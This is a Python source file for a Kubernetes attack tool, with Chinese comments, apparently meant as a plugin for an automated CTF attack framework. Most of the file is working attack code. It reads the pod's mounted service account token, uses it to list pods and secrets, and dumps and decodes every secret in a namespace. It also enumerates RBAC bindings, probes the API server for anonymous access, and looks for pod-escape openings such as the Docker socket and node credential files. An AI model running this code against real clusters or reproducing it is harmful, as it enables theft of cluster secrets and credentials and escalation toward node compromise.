# tools/kube_attacker.py
"""
Kubernetes 攻击工具

支持的攻击向量：
1. Service Account 滥用 - 利用挂载的 SA Token
2. Pod 逃逸 - 容器逃逸到节点
3. Secrets 窃取 - 读取 K8s Secrets
4. RBAC 权限提升 - 利用过度权限
5. 匿名访问 - 未授权访问 API Server
6. etcd 数据窃取 - 直接访问 etcd

CTF场景优化:
- 自动发现 K8s 环境
- 一键利用常见漏洞
- 获取敏感信息

集成：
- app.logger
- tool_framework
"""

from typing import Dict, Any, List, Optional
import subprocess
import os
import json
import re

from tool_framework import CommandLineTool

# 集成日志
try:
    from app.logger import get_logger
except ImportError:
    from logger import get_logger

logger = get_logger("KubeAttacker")


class KubeAttackType:
    """K8s攻击类型"""
    SERVICE_ACCOUNT = "service_account"
    POD_ESCAPE = "pod_escape"
    SECRETS_DUMP = "secrets_dump"
    RBAC_ENUM = "rbac_enum"
    ANONYMOUS = "anonymous"
    ETCD = "etcd"


class KubeAttackerTool(CommandLineTool):
    """Kubernetes攻击工具"""

    # 前置条件声明
    REQUIRES_CREDENTIALS = False
    REQUIRES_SHELL_SESSION = True
    TOOL_CATEGORY = "attacker"
    REQUIRES_OS = "linux"

    def __init__(self):
        self.timeout = 180
        super().__init__("kubectl")

    def name(self) -> str:
        return "kube-attacker"

    def description(self) -> str:
        return "Kubernetes攻击工具，支持SA滥用、Pod逃逸、Secrets窃取、RBAC提权等攻击向量"

    def supported_vulns(self) -> list:
        return [
            "Kubernetes", "K8s", "Container Escape", "Service Account",
            "RBAC Misconfiguration", "Pod Security", "etcd"
        ]

    def capability_statement(self) -> str:
        return "K8s攻击工具。检测并利用K8s环境漏洞。支持：SA Token滥用、Pod逃逸、Secrets窃取。适合：容器环境、云原生应用、K8s集群攻击。"

    def check_available(self) -> bool:
        """检查 kubectl 是否可用"""
        import shutil
        return shutil.which("kubectl") is not None

    def expected_params(self) -> Dict[str, Dict[str, Any]]:
        return {
            "action": {
                "type": "str",
                "description": "操作: detect/sa-abuse/secrets/pod-escape/rbac/anonymous",
                "required": True
            },
            "namespace": {
                "type": "str",
                "description": "K8s命名空间（默认default）",
                "required": False,
                "default": "default"
            },
            "pod_name": {
                "type": "str",
                "description": "Pod名称（某些操作需要）",
                "required": False
            },
            "secret_name": {
                "type": "str",
                "description": "Secret名称（窃取特定Secret）",
                "required": False
            },
            "api_server": {
                "type": "str",
                "description": "API Server地址（如 https://10.96.0.1:443）",
                "required": False
            },
            "token_path": {
                "type": "str",
                "description": "Service Account Token路径",
                "required": False,
                "default": "/var/run/secrets/kubernetes.io/serviceaccount/token"
            }
        }

    def execute(self, target: str, params: Dict) -> Dict:
        """执行K8s攻击操作"""
        action = params.get("action", "detect")

        action_map = {
            "detect": self._detect_k8s_environment,
            "sa-abuse": self._service_account_abuse,
            "secrets": self._dump_secrets,
            "pod-escape": self._pod_escape,
            "rbac": self._enumerate_rbac,
            "anonymous": self._anonymous_access
        }

        handler = action_map.get(action)
        if not handler:
            return {"error": f"不支持的操作: {action}", "success": False}

        return handler(params)

    def _detect_k8s_environment(self, params: Dict) -> Dict:
        """检测是否在K8s环境中"""
        results = {
            "success": True,
            "in_k8s": False,
            "service_account": False,
            "api_server": None,
            "namespace": None
        }

        logger.info("[KubeAttacker] 检测K8s环境...")

        # 检查 Service Account Token
        sa_token_path = "/var/run/secrets/kubernetes.io/serviceaccount/token"
        if os.path.exists(sa_token_path):
            results["service_account"] = True
            results["in_k8s"] = True
            logger.info("[KubeAttacker] 发现 Service Account Token")

            # 读取 namespace
            ns_path = "/var/run/secrets/kubernetes.io/serviceaccount/namespace"
            if os.path.exists(ns_path):
                with open(ns_path, 'r') as f:
                    results["namespace"] = f.read().strip()

        # 检查环境变量
        k8s_vars = ["KUBERNETES_SERVICE_HOST", "KUBERNETES_SERVICE_PORT"]
        if all(var in os.environ for var in k8s_vars):
            results["in_k8s"] = True
            results["api_server"] = f"https://{os.environ['KUBERNETES_SERVICE_HOST']}:{os.environ['KUBERNETES_SERVICE_PORT']}"
            logger.info(f"[KubeAttacker] API Server: {results['api_server']}")

        # 检查常见K8s文件
        k8s_files = [
            "/.dockerenv",
            "/run/secrets/kubernetes.io",
            "/var/run/secrets/kubernetes.io"
        ]
        for f in k8s_files:
            if os.path.exists(f):
                results["in_k8s"] = True

        # 检查 kubectl
        import shutil
        if shutil.which("kubectl"):
            results["kubectl_available"] = True

            # 尝试获取集群信息
            try:
                result = subprocess.run(
                    ["kubectl", "cluster-info"],
                    capture_output=True, text=True, timeout=10
                )
                if result.returncode == 0:
                    results["cluster_info"] = result.stdout[:500]
            except Exception:
                pass

        return results

    def _service_account_abuse(self, params: Dict) -> Dict:
        """Service Account Token滥用"""
        results = {
            "success": True,
            "token_found": False,
            "permissions": [],
            "secrets": []
        }

        token_path = params.get("token_path", "/var/run/secrets/kubernetes.io/serviceaccount/token")
        namespace = params.get("namespace", "default")
        api_server = params.get("api_server")

        if not api_server:
            # 尝试从环境变量获取
            host = os.environ.get("KUBERNETES_SERVICE_HOST", "10.96.0.1")
            port = os.environ.get("KUBERNETES_SERVICE_PORT", "443")
            api_server = f"https://{host}:{port}"

        logger.info(f"[KubeAttacker] SA滥用: {api_server}")

        # 读取Token
        if not os.path.exists(token_path):
            results["error"] = "Service Account Token不存在"
            results["success"] = False
            return results

        with open(token_path, 'r') as f:
            token = f.read().strip()
        results["token_found"] = True
        results["token_preview"] = token[:50] + "..." if len(token) > 50 else token

        # 使用Token访问API
        try:
            # 枚举权限
            cmd = [
                "curl", "-s", "-k",
                "-H", f"Authorization: Bearer {token}",
                f"{api_server}/api/v1/namespaces/{namespace}/pods"
            ]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)

            if result.returncode == 0:
                data = json.loads(result.stdout)
                if "items" in data:
                    results["pods"] = [p["metadata"]["name"] for p in data["items"][:10]]
                    results["can_list_pods"] = True
                    logger.info(f"[KubeAttacker] 可列出 {len(results['pods'])} 个Pod")

        except json.JSONDecodeError:
            results["api_error"] = "无法解析API响应"
        except Exception as e:
            results["api_error"] = str(e)

        # 尝试列出Secrets
        try:
            cmd = [
                "curl", "-s", "-k",
                "-H", f"Authorization: Bearer {token}",
                f"{api_server}/api/v1/namespaces/{namespace}/secrets"
            ]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)

            if result.returncode == 0:
                data = json.loads(result.stdout)
                if "items" in data:
                    results["secrets"] = [s["metadata"]["name"] for s in data["items"][:10]]
                    results["can_list_secrets"] = True
                    logger.info(f"[KubeAttacker] 可列出 {len(results['secrets'])} 个Secret")

        except Exception:
            pass

        return results

    def _dump_secrets(self, params: Dict) -> Dict:
        """窃取K8s Secrets"""
        results = {
            "success": True,
            "secrets": []
        }

        namespace = params.get("namespace", "default")
        secret_name = params.get("secret_name")
        token_path = params.get("token_path", "/var/run/secrets/kubernetes.io/serviceaccount/token")

        logger.info(f"[KubeAttacker] 窃取Secrets: namespace={namespace}")

        # 读取Token
        token = None
        if os.path.exists(token_path):
            with open(token_path, 'r') as f:
                token = f.read().strip()

        host = os.environ.get("KUBERNETES_SERVICE_HOST", "10.96.0.1")
        port = os.environ.get("KUBERNETES_SERVICE_PORT", "443")
        api_server = f"https://{host}:{port}"

        # 使用kubectl（如果可用）
        import shutil
        if shutil.which("kubectl"):
            try:
                if secret_name:
                    cmd = ["kubectl", "get", "secret", secret_name, "-n", namespace, "-o", "json"]
                else:
                    cmd = ["kubectl", "get", "secrets", "-n", namespace, "-o", "json"]

                result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)

                if result.returncode == 0:
                    data = json.loads(result.stdout)
                    if "items" in data:
                        for s in data["items"]:
                            secret_data = {
                                "name": s["metadata"]["name"],
                                "type": s.get("type", "Opaque"),
                                "data_keys": list(s.get("data", {}).keys())
                            }
                            # 解码数据
                            import base64
                            decoded_data = {}
                            for k, v in s.get("data", {}).items():
                                try:
                                    decoded_data[k] = base64.b64decode(v).decode('utf-8', errors='ignore')
                                except Exception:
                                    decoded_data[k] = f"<binary:{len(v)}>"
                            secret_data["decoded_data"] = decoded_data
                            results["secrets"].append(secret_data)
                    elif "metadata" in data:
                        # 单个Secret
                        import base64
                        decoded_data = {}
                        for k, v in data.get("data", {}).items():
                            try:
                                decoded_data[k] = base64.b64decode(v).decode('utf-8', errors='ignore')
                            except Exception:
                                decoded_data[k] = f"<binary>"
                        results["secrets"].append({
                            "name": data["metadata"]["name"],
                            "type": data.get("type", "Opaque"),
                            "decoded_data": decoded_data
                        })

                    logger.info(f"[KubeAttacker] 获取 {len(results['secrets'])} 个Secret")

            except Exception as e:
                results["error"] = str(e)

        # 使用curl + Token（备选方案）
        elif token:
            try:
                cmd = [
                    "curl", "-s", "-k",
                    "-H", f"Authorization: Bearer {token}",
                    f"{api_server}/api/v1/namespaces/{namespace}/secrets"
                ]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)

                if result.returncode == 0:
                    data = json.loads(result.stdout)
                    if "items" in data:
                        results["secrets"] = [
                            {"name": s["metadata"]["name"], "type": s.get("type", "Opaque")}
                            for s in data["items"][:20]
                        ]
            except Exception:
                pass

        return results

    def _pod_escape(self, params: Dict) -> Dict:
        """Pod逃逸检测与利用"""
        results = {
            "success": True,
            "escape_vectors": [],
            "node_access": False
        }

        logger.info("[KubeAttacker] 检测Pod逃逸向量...")

        # 检查特权容器
        try:
            with open("/proc/1/status", "r") as f:
                status = f.read()
                if "CapEff:" in status:
                    caps_line = [l for l in status.split("\n") if l.startswith("CapEff:")][0]
                    caps = caps_line.split(":")[1].strip()
                    # 检查是否有所有权限
                    if caps == "0000003fffffffff":
                        results["escape_vectors"].append({
                            "type": "privileged_container",
                            "description": "运行在特权模式下，可能可以逃逸"
                        })
                        results["node_access"] = True
        except Exception:
            pass

        # 检查敏感挂载
        sensitive_mounts = [
            "/var/run/docker.sock",
            "/run/docker.sock",
            "/var/run/containerd/containerd.sock",
            "/run/containerd/containerd.sock",
            "/proc",
            "/sys",
            "/root",
            "/etc/kubernetes",
            "/var/lib/kubelet",
            "/var/lib/etcd"
        ]

        try:
            with open("/proc/mounts", "r") as f:
                mounts = f.read()
                for mount in sensitive_mounts:
                    if mount in mounts:
                        results["escape_vectors"].append({
                            "type": "sensitive_mount",
                            "mount": mount,
                            "description": f"挂载了敏感路径 {mount}"
                        })
        except Exception:
            pass

        # 检查节点文件
        node_files = [
            "/etc/kubernetes/admin.conf",
            "/etc/kubernetes/kubelet.conf",
            "/var/lib/kubelet/pki/kubelet-client-current.pem"
        ]

        for f in node_files:
            if os.path.exists(f):
                results["escape_vectors"].append({
                    "type": "node_file_access",
                    "file": f,
                    "description": f"可访问节点文件 {f}"
                })

        # 检查Docker socket
        if os.path.exists("/var/run/docker.sock"):
            results["docker_socket"] = True
            results["escape_vectors"].append({
                "type": "docker_socket",
                "description": "可访问Docker socket，可能可以逃逸到宿主机"
            })

        return results

    def _enumerate_rbac(self, params: Dict) -> Dict:
        """枚举RBAC权限"""
        results = {
            "success": True,
            "roles": [],
            "role_bindings": [],
            "cluster_roles": [],
            "can_do": []
        }

        logger.info("[KubeAttacker] 枚举RBAC权限...")

        import shutil
        if not shutil.which("kubectl"):
            results["error"] = "kubectl不可用"
            return results

        # 获取当前权限
        try:
            result = subprocess.run(
                ["kubectl", "auth", "can-i", "--list"],
                capture_output=True, text=True, timeout=30
            )

            if result.returncode == 0:
                lines = result.stdout.strip().split("\n")
                for line in lines:
                    if line.strip() and not line.startswith("NonResourceURLs"):
                        parts = line.split()
                        if len(parts) >= 2:
                            results["can_do"].append({
                                "resource": parts[0],
                                "verbs": parts[1:] if len(parts) > 1 else []
                            })
        except Exception:
            pass

        # 列出RoleBindings
        try:
            result = subprocess.run(
                ["kubectl", "get", "rolebindings,clusterrolebindings", "-A", "-o", "json"],
                capture_output=True, text=True, timeout=30
            )

            if result.returncode == 0:
                data = json.loads(result.stdout)
                for item in data.get("items", []):
                    binding = {
                        "name": item["metadata"]["name"],
                        "namespace": item["metadata"].get("namespace", "cluster-wide"),
                        "role_ref": item.get("roleRef", {}).get("name", ""),
                        "subjects": [s.get("name", "") for s in item.get("subjects", [])]
                    }
                    if "namespace" in item["metadata"]:
                        results["role_bindings"].append(binding)
                    else:
                        results["cluster_roles"].append(binding)
        except Exception:
            pass

        return results

    def _anonymous_access(self, params: Dict) -> Dict:
        """检测匿名访问"""
        results = {
            "success": True,
            "anonymous_access": False,
            "api_endpoints": []
        }

        api_server = params.get("api_server")
        if not api_server:
            host = os.environ.get("KUBERNETES_SERVICE_HOST", "10.96.0.1")
            port = os.environ.get("KUBERNETES_SERVICE_PORT", "443")
            api_server = f"https://{host}:{port}"

        logger.info(f"[KubeAttacker] 检测匿名访问: {api_server}")

        # 测试常见端点
        endpoints = [
            "/api",
            "/api/v1",
            "/api/v1/namespaces",
            "/api/v1/pods",
            "/apis",
            "/healthz",
            "/version"
        ]

        for endpoint in endpoints:
            try:
                cmd = ["curl", "-s", "-k", f"{api_server}{endpoint}"]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)

                if result.returncode == 0 and result.stdout:
                    try:
                        data = json.loads(result.stdout)
                        if "kind" in data or "paths" in data:
                            results["api_endpoints"].append({
                                "endpoint": endpoint,
                                "accessible": True,
                                "kind": data.get("kind", "unknown")
                            })
                            results["anonymous_access"] = True
                    except json.JSONDecodeError:
                        if "ok" in result.stdout.lower():
                            results["api_endpoints"].append({
                                "endpoint": endpoint,
                                "accessible": True,
                                "kind": "health"
                            })
            except Exception:
                pass

        if results["anonymous_access"]:
            logger.warning("[KubeAttacker] 发现匿名访问!")

        return results


# 全局实例
_kube_attacker_tool = None


def get_kube_attacker_tool() -> KubeAttackerTool:
    global _kube_attacker_tool
    if _kube_attacker_tool is None:
        _kube_attacker_tool = KubeAttackerTool()
    return _kube_attacker_tool


def register():
    from tool_framework import ToolRegistry
    ToolRegistry.register(KubeAttackerTool())